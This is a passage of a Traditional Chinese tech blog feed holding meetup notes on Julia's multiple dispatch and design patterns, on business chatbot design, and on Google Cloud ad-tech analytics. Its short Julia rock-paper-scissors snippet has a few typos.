&lt;li&gt;Method 不屬於某個 datatype  &lt;/li&gt;
&lt;li&gt;Julia 的 OOP 比較著重在 behavior (function) 的部份  &lt;ul&gt;
&lt;li&gt;例如以往我們可能得針對信用卡和悠遊卡分別撰寫其儲值這個動作的 function，然後要使用的時候便以 &lt;code&gt;悠遊卡.儲值()&lt;/code&gt; 或 &lt;code&gt;信用卡.儲值()&lt;/code&gt; 的方式使用，這種方式又被稱為 single dispatch。  &lt;/li&gt;
&lt;li&gt;但 Julia 則是以撰寫儲值這個 behavior 為主，使用時會變成，&lt;code&gt;儲值.悠遊卡()&lt;/code&gt; 和 &lt;code&gt;儲值.信用卡()&lt;/code&gt; 的方式使用，這種方式不同於以往習慣的 single dispatch，而是 multiple dispatch。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何用 multiple dispatch 寫猜拳遊戲？  &lt;ul&gt;
&lt;li&gt;The beauty of multiple dispatch  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://giordano.github.io/blog/2017-11-03-rock-paper-scissors/"&gt;https://giordano.github.io/blog/2017-11-03-rock-paper-scissors/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;abstract type Shape end  

struct Rock &amp;lt;: Shane end  
struct Paper &amp;lt;: Shane end  
struct Scissors &amp;lt;: Shane end  

play(::Type{Paper}, ::Type{Rock}) = 1  
play(::Type{Scissors}, ::Type{Papper}) = 1  
play(::Type{Rock}, ::Type{Scissors}) = 1  

play(::Type{T}, ::Type{T}) where {T &amp;lt;: Shape} = 0  

play(a:Type{&amp;lt;:Shape}, b::Type{&amp;lt;:Shape}) = - play(b, a)  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;可以把更抽象的代數運算放到 Julia 裡頭去做，但不用像以前一樣寫一大堆 if else。  &lt;/li&gt;
&lt;li&gt;Design Patterns  &lt;ul&gt;
&lt;li&gt;Composite pattern  &lt;ul&gt;
&lt;li&gt;希望結構上呈現「部份-整體」的概念  &lt;ul&gt;
&lt;li&gt;比如說你想畫一張圖  &lt;ul&gt;
&lt;li&gt;可能會包含：線、圖片、文字，而圖片裏面可能又會有不同的形狀，所以可以抽象成一個樹狀的結構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recursive composition  &lt;ul&gt;
&lt;li&gt;可能會有遞迴式的組合  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Composite lets clients treat individual objects and compositions of objects uniformly.  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/composite.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/composite.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/composite.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/composite.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decorator pattern  &lt;ul&gt;
&lt;li&gt;例如：可以幫一把槍加上不同的配件，而且同樣的配件還還可以不只加一次。  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/decorator.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/decorator.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/decorator.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/decorator.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Observer pattern  &lt;ul&gt;
&lt;li&gt;Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically.  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/observer.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/observer.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/observer.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/observer.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chain of responsibility pattern  &lt;ul&gt;
&lt;li&gt;Launch-and-leave requests with a single processing pipeline that contains many possible handlers.  &lt;/li&gt;
&lt;li&gt;把東西送到某個人手上，如果他能處理就處理，如果不能處理的話，就丟給下一個人處理。  &lt;/li&gt;
&lt;li&gt;如果到最後都沒有人處理的話，那就是另外一回事了。  &lt;/li&gt;
&lt;li&gt;Example code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/src/chain_of_responsibility.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/src/chain_of_responsibility.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuehhua/patterns.jl/blob/master/test/chain_of_responsibility.jl"&gt;https://github.com/yuehhua/patterns.jl/blob/master/test/chain_of_responsibility.jl&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/FluxML/Flux.jl"&gt;https://github.com/FluxML/Flux.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Julia 的 naming convention 對於 function 的部份，如果 function name 是以 &lt;code&gt;!&lt;/code&gt; 做結尾的話，代表這個 function 有 side effect。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Algebraic_data_type"&gt;Algebraic data type&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaComputing/FemtoCleaner.jl"&gt;GitHub - JuliaComputing/FemtoCleaner.jl: The code behind femtocleaner&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/apps/femtocleaner"&gt;femtocleaner - Cleans your julia projects by upgrading deprecated syntax, removing version compatibility workarounds and anything else that has a unique upgrade path.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaStats/TimeSeries.jl"&gt;GitHub - JuliaStats/TimeSeries.jl: Time series toolkit for Julia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaCI/Nanosoldier.jl"&gt;GitHub - JuliaCI/Nanosoldier.jl: A package for running JuliaCI services on MIT's Nanosoldier cluster&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以幫你在 CI 的過程中測 Julia 程式碼的 Performance。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 17 Nov 2017 21:30:48 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-11-17:posts/2017/11/17/julia-taiwan-meetup-10/</guid><category>julialang</category></item><item><title>Facebook Developer Circle: Taipei - Meetup #4</title><link>https://blog.m157q.tw/posts/2017/09/27/facebook-developer-circle-taipei-meetup-4/</link><description>&lt;p&gt;Event link: &lt;a href="https://fdctaipei.kktix.cc/events/fdc201709"&gt;https://fdctaipei.kktix.cc/events/fdc201709&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;用 OLAMI 打造各種形式的中文聊天機器人&lt;/h2&gt;
&lt;p&gt;講者：Ryan Hang (威盛電子 OLAMI Team)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OLAMI 中文自然語言處理平台 （威盛電子開發）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://olami.ai"&gt;https://olami.ai&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歷程  &lt;ul&gt;
&lt;li&gt;5 年前開始做，從 rule-based 開始，還沒用 Machine Learning。  &lt;/li&gt;
&lt;li&gt;到現在都還是很推薦用 rule-based，為什麼？  &lt;ul&gt;
&lt;li&gt;Machine Learning 的開發速度較緩慢，更新的速度可能更不上產品的需求，rule-based 就比較容易做到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OLAMI AI 對話系統資訊流概觀  &lt;ul&gt;
&lt;li&gt;輸入 =&amp;gt; NLI 自然語言互動系統 (+ 客製化語意理解) =&amp;gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 語音互動  &lt;ul&gt;
&lt;li&gt;OLAMI Voice Kit  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live Demo  &lt;ul&gt;
&lt;li&gt;速度還滿快的，感覺可以試試看，API 接一接應該不難。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;商務 Chatbot 體驗設計要訣&lt;/h2&gt;
&lt;p&gt;講者：Calvin Lin (Yoctol)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Business Chatbot 簡介  &lt;ul&gt;
&lt;li&gt;目的為實際商業應用，非純娛樂性質  &lt;/li&gt;
&lt;li&gt;主要功能包含  &lt;ul&gt;
&lt;li&gt;智慧客服：自動回覆常見問題，減少客服人員負擔。  &lt;/li&gt;
&lt;li&gt;訊息推播：文章訂閱、優惠訊息、活動通知  &lt;/li&gt;
&lt;li&gt;資訊查詢：查詢最新優惠、查股價、物流到貨查詢  &lt;/li&gt;
&lt;li&gt;商業互動：下單付款、預約登記、風險屬性評測  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chatbot 體驗的關鍵問題  &lt;ul&gt;
&lt;li&gt;預設用途  &lt;ul&gt;
&lt;li&gt;可以輸入任意文字並得到適當的回應  &lt;/li&gt;
&lt;li&gt;期待過高 =&amp;gt; 體驗不如預期 =&amp;gt; 失望  &lt;/li&gt;
&lt;li&gt;Business Chatbot 的限制  &lt;ul&gt;
&lt;li&gt;不能呼攏使用者  &lt;/li&gt;
&lt;li&gt;回覆內容要可控制  &lt;ul&gt;
&lt;li&gt;完全生成式的流程在商業應用上是有疑慮的，因為不知道會回出什麼樣的內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;指意  &lt;ul&gt;
&lt;li&gt;文字輸入框太過於自由，會讓使用者不知道要輸入什麼。得不到使用者期望的回答就會造成使用者的失望進而不想繼續使用。  &lt;/li&gt;
&lt;li&gt;為 Chatbot 添加指意  &lt;ul&gt;
&lt;li&gt;選單式引導(Generic Template, Button Template, Image map (LINE))  &lt;/li&gt;
&lt;li&gt;適時的文字提示（例句提示、Quick Reply）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 對體驗的影響  &lt;ul&gt;
&lt;li&gt;影響能力範圍  &lt;ul&gt;
&lt;li&gt;極致的 NLP：  &lt;ul&gt;
&lt;li&gt;可以輸入任意文字並得到適當的回覆 =&amp;gt; 滿足預設用途  &lt;/li&gt;
&lt;li&gt;使用者體驗會超極好，但實務上基本上做不太到，開發成本過高。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完全沒有 NLP  &lt;ul&gt;
&lt;li&gt;封鎖輸入框 =&amp;gt; 能力大幅受限  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 的實作方式  &lt;ul&gt;
&lt;li&gt;完全字串比對、關鍵字  &lt;/li&gt;
&lt;li&gt;正規表達式  &lt;/li&gt;
&lt;li&gt;RNN （遞迴式類神經網路）  &lt;ul&gt;
&lt;li&gt;輸入一些同樣意思的例句，讓 AI 去歸納和推論這些都是相同的意思。  &lt;/li&gt;
&lt;li&gt;實作比較複雜，訓練難度也比較高，會花比較多時間。  &lt;/li&gt;
&lt;li&gt;需要一點時間計算，所以在實務上回應使用者的時間會有點太長。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;視情況而定  &lt;ul&gt;
&lt;li&gt;比較明確的狀況使用字串比對或正規表達式，速度會比較快，使用者體驗會比較好。  &lt;/li&gt;
&lt;li&gt;比較複雜的狀況就採用 RNN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;體驗設計要訣  &lt;ol&gt;
&lt;li&gt;不同的使用者族群  &lt;ul&gt;
&lt;li&gt;既有客戶  &lt;ul&gt;
&lt;li&gt;有明確的問題想問 =&amp;gt; 確保重要的問題能被回應  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;新客戶、潛在客戶  &lt;ul&gt;
&lt;li&gt;認真想瞭解，但沒有明確的問題 =&amp;gt; 引導客戶探索主要功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;湊熱鬧的路人  &lt;ul&gt;
&lt;li&gt;只是剛好路過看到一個 bot，隨便玩一玩覺得你什麼都答不出來，然後說一句「好笨」就走了。XD  &lt;/li&gt;
&lt;li&gt;隨便玩 =&amp;gt; 明確提示使用範圍，縮小期望落差。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;開場引導  &lt;ul&gt;
&lt;li&gt;用了 Generic Template 或 Button Template 的時候，可以再加些文字引導使用者，讓使用者覺得不是只有可以點按鈕而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;迷途引導  &lt;ul&gt;
&lt;li&gt;用提醒引導使用者回去使用正常的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;請求更多資訊  &lt;ul&gt;
&lt;li&gt;向使用者確認其目的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要停止引導  &lt;ul&gt;
&lt;li&gt;只要出現斷點，使用者就容易：  &lt;ul&gt;
&lt;li&gt;不知所措得離開  &lt;/li&gt;
&lt;li&gt;亂問不在範圍內的問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;引導方式  &lt;ul&gt;
&lt;li&gt;接續目前的互動  &lt;/li&gt;
&lt;li&gt;推薦相關的選項  &lt;/li&gt;
&lt;li&gt;探索其他功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;使用情境 Demo  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;如何用 Messenger Bot 提升 EC/O2O 成交轉換率&lt;/h2&gt;
&lt;p&gt;講者：Lucas (AsiaYo Product Lead)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;緣由  &lt;ul&gt;
&lt;li&gt;一年前團隊就在討論要不要用 Chatbot 取代真人客服  &lt;/li&gt;
&lt;li&gt;結論是被否決的，因為能解決的問題像是使用者的行李和 check-in 的問題很難用 chatbot 解決，並不會減少真人客服的負擔  &lt;/li&gt;
&lt;li&gt;LINE 的 chatbot =&amp;gt; 3 steps before interaction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;那為什麼後來做了 Facebook Messenger Bot  &lt;ul&gt;
&lt;li&gt;Facebook Messenger bot =&amp;gt; 1 steps before interaction  &lt;/li&gt;
&lt;li&gt;直接接觸到使用者的成本低了很多  &lt;ul&gt;
&lt;li&gt;OTA's users have longer decision funnel  &lt;ul&gt;
&lt;li&gt;會和朋友討論、可能還會在期間去其他民宿網比價、轉換流失率很高  &lt;/li&gt;
&lt;li&gt;對應機制  &lt;ul&gt;
&lt;li&gt;Agoda: 不斷寄 email =&amp;gt; 需要拿到使用者的個人資料（email 或電話）  &lt;/li&gt;
&lt;li&gt;透過 retargeting ad 讓使用者不管到哪裡都會看到 =&amp;gt; 花費高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;需要的 Designer 少很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Key Metrics  &lt;ul&gt;
&lt;li&gt;同意授權 &amp;gt; 第一次互動 &amp;gt; 轉換  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System Architecture  &lt;ul&gt;
&lt;li&gt;Facebook checkbot plugin =&amp;gt; Chatfuel (JSON API) =&amp;gt; AsiaYo API =&amp;gt; Chatfuel (JSON API) =&amp;gt; Chatfuel Blocks (1st message)  &lt;ul&gt;
&lt;li&gt;hmm... 沒想到 Chatfuel JSON API 可以拿來這樣做，這樣應該連自己的 webhook server 都不用架了？跟 Facebook server 溝通那邊就由 Chatfuel 幫忙處理掉，跟 Facebook 那邊溝通的確會是花最多時間的地方，畢竟 Facebook 沒有官方的 Messenger Bot Framework，第三方的也不盡理想。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第一次互動  &lt;ul&gt;
&lt;li&gt;要具有趣味性與互動性  &lt;ul&gt;
&lt;li&gt;對話設計成像遊戲  &lt;/li&gt;
&lt;li&gt;隨機彩蛋 + 優惠碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實用性 &amp;amp; Cross Promotion  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Takeaways  &lt;ul&gt;
&lt;li&gt;Context matters  &lt;/li&gt;
&lt;li&gt;Createing Aha moments  &lt;ul&gt;
&lt;li&gt;讓使用者有眼睛一亮的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Future Works  &lt;ul&gt;
&lt;li&gt;Cart abandoned  &lt;/li&gt;
&lt;li&gt;Check order status  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 27 Sep 2017 21:50:52 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-09-27:posts/2017/09/27/facebook-developer-circle-taipei-meetup-4/</guid><category>Facebook</category></item><item><title>CloudMile Google Cloud Ad Tech Seminar</title><link>https://blog.m157q.tw/posts/2017/09/22/cloudmile-google-cloud-ad-tech-seminar/</link><description>&lt;h2&gt;GCP 簡介及 AD Tech 應用趨勢&lt;/h2&gt;
&lt;p&gt;Speaker: Harry Lin, Google Cloud Customer Engineer Lead  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Data lives in silos  &lt;ul&gt;
&lt;li&gt;資料是各自獨立的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For marketers - especially difficult to get a single view  &lt;ul&gt;
&lt;li&gt;Web Analytics, SEM, Ad Server, DSP, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Understading your customer?  &lt;ul&gt;
&lt;li&gt;資料完全分散，無法連結的話就無法得到有價值的資訊，也就無法瞭解使用者。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can Google Cloud help you?  &lt;ul&gt;
&lt;li&gt;Google Analytics  &lt;ul&gt;
&lt;li&gt;Features  &lt;ul&gt;
&lt;li&gt;Acquisition &amp;amp; Behaviour Report  &lt;/li&gt;
&lt;li&gt;Enhanced e-commerce  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scenarios  &lt;ul&gt;
&lt;li&gt;有多種不同的資料來源  &lt;ul&gt;
&lt;li&gt;有 GA 的資料  &lt;/li&gt;
&lt;li&gt;有自己收集的資料  &lt;/li&gt;
&lt;li&gt;有跟其他合作伙伴拿到的資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Insight 1-2-3  &lt;ol&gt;
&lt;li&gt;Collect the data  &lt;ul&gt;
&lt;li&gt;BigQuery Data Transfer Service: Adwords, Double Click, Youtube  &lt;/li&gt;
&lt;li&gt;Direct Connectivity: Google Analytics 360 Suite, Firebase  &lt;/li&gt;
&lt;li&gt;Connectivity via Partners: informatica, Segment, talend, ...  &lt;/li&gt;
&lt;li&gt;三種途徑將所有的資料都匯入 BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cleanse the data  &lt;ul&gt;
&lt;li&gt;BigQuery (Raw Data) =&amp;gt; Cloud Dataprep (Data Analysts), Cloud Dataflow (Data Engineers) =&amp;gt; BigQuery (Clean Data)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analyze &amp;amp; Visualize  &lt;ul&gt;
&lt;li&gt;Analyze: BigQuery, Microsoft Excel, Google Sheets, JDBC/ODBS connectors  &lt;/li&gt;
&lt;li&gt;Visualize: Google Data Studio, tableau, looker, BI/Analytics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attribution Modeling: Which of my Channels Drive the Most Success?  &lt;ul&gt;
&lt;li&gt;Multi-channel  &lt;ul&gt;
&lt;li&gt;透過結合不同的 Custom ID，將資料一起灌到 BigQuery 分析，把使用者的行為連接起來。  &lt;ul&gt;
&lt;li&gt;Youtube, DoubleClick, Adwords, CRM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cookie based or Session based mapping 得透過 CRM 的 Custom ID 連接  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data lifecycle on Google  &lt;ul&gt;
&lt;li&gt;Capture  &lt;/li&gt;
&lt;li&gt;Process  &lt;/li&gt;
&lt;li&gt;Store  &lt;/li&gt;
&lt;li&gt;Analyze  &lt;/li&gt;
&lt;li&gt;Use  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Segment high value customers by behaviour  &lt;ul&gt;
&lt;li&gt;Fantasy Bingers  &lt;/li&gt;
&lt;li&gt;Action Weekly Tune-ins  &lt;/li&gt;
&lt;li&gt;Nightly Updates  &lt;/li&gt;
&lt;li&gt;Touch-and-Go Nature Clippers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ingest Data into BigQuery  &lt;ul&gt;
&lt;li&gt;有乾淨整理好的資料才能訓練出有用的模型，否則只是 garbage in, garbage out.  &lt;/li&gt;
&lt;li&gt;Indigest Data  &lt;/li&gt;
&lt;li&gt;Transform Data with Dataflow pipeline  &lt;/li&gt;
&lt;li&gt;Customer-Segmentation using ML/Clustering  &lt;ul&gt;
&lt;li&gt;Google Cloud Datalab  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Snapchat  &lt;ul&gt;
&lt;li&gt;QPS second only to Gmail  &lt;/li&gt;
&lt;li&gt;Bandwidth second only to Youtube  &lt;/li&gt;
&lt;li&gt;Monetization - Ads and Geofilters  &lt;ul&gt;
&lt;li&gt;In-App Image Search  &lt;/li&gt;
&lt;li&gt;3V - Vertical Video Views  &lt;/li&gt;
&lt;li&gt;Custom Geofilters  &lt;/li&gt;
&lt;li&gt;Early Adopters  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;AD Tech 在 GCP 上的應用技術簡介及國外案例&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Impact of Maching Learning  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.hbrtaiwan.com/article_content_AR0007025.html"&gt;資料分析運用四大階段&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;描述型分析：發生了什麼  &lt;/li&gt;
&lt;li&gt;診斷型分析：為什麼發生  &lt;/li&gt;
&lt;li&gt;預測型分析：未來會不會發生  &lt;/li&gt;
&lt;li&gt;指示型分析：如何讓它發生  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;汽車業  &lt;ul&gt;
&lt;li&gt;物件偵測  &lt;/li&gt;
&lt;li&gt;自動駕駛  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;醫療業  &lt;ul&gt;
&lt;li&gt;醫療影像辨識  &lt;/li&gt;
&lt;li&gt;個人化投藥  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;金融業  &lt;ul&gt;
&lt;li&gt;金融趨勢分析  &lt;/li&gt;
&lt;li&gt;異常偵測  &lt;ul&gt;
&lt;li&gt;盜刷  &lt;/li&gt;
&lt;li&gt;是否被詐騙  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電商  &lt;ul&gt;
&lt;li&gt;分析使用者行為  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Impact of Ad Tech  &lt;ul&gt;
&lt;li&gt;精準投放  &lt;/li&gt;
&lt;li&gt;Programmatic Buying  &lt;/li&gt;
&lt;li&gt;Media Planning Flow  &lt;ul&gt;
&lt;li&gt;What?  &lt;/li&gt;
&lt;li&gt;Who?  &lt;/li&gt;
&lt;li&gt;Where?  &lt;/li&gt;
&lt;li&gt;When?  &lt;/li&gt;
&lt;li&gt;How much?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recommendation Engine  &lt;ul&gt;
&lt;li&gt;相似廣告推薦  &lt;/li&gt;
&lt;li&gt;相似廣告受眾推薦  &lt;/li&gt;
&lt;li&gt;即時性推薦  &lt;ul&gt;
&lt;li&gt;根據使用者當下的時間點、地點、溫度、溼度做推薦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Personalization  &lt;ul&gt;
&lt;li&gt;抓出受眾的各個特徵  &lt;ul&gt;
&lt;li&gt;比較不容易得到的是偏向心理層面的特徵，可能得透過平常的行為去進行分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;86% 的消費者證實個人化行銷會影響他們的購買決策  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Audience Classification  &lt;ul&gt;
&lt;li&gt;Predict Click  &lt;ul&gt;
&lt;li&gt;將有點擊廣告和沒點擊廣告的歷史資訊拿來訓練出模型，之後就可以拿來預測是否會點擊廣告。  &lt;/li&gt;
&lt;li&gt;更複雜一點的就可以再加入更多的條件去做分類  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clustering  &lt;ul&gt;
&lt;li&gt;Lookalike audience  &lt;ul&gt;
&lt;li&gt;可以達到不需要浪費過多的資源就達成有效的廣告頭放  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Bidding: Right time, Right user, Right bid  &lt;ul&gt;
&lt;li&gt;Google Adwords: 將行銷列表、時間、瀏覽器、作業系統等等作為競價條件  &lt;/li&gt;
&lt;li&gt;Real Time Budget Allocation  &lt;ul&gt;
&lt;li&gt;不同的時間點設定不同的競價條件，達到即時動態調整預算，節省開銷且提升精準度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cases  &lt;ul&gt;
&lt;li&gt;MainAd  &lt;ul&gt;
&lt;li&gt;捨棄描述型的分析，採用了預測型的分析  &lt;ul&gt;
&lt;li&gt;描述型分析：先競價、再驗收、後預測  &lt;/li&gt;
&lt;li&gt;預測型分析：先預測、再競價、後驗收  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jivox  &lt;ul&gt;
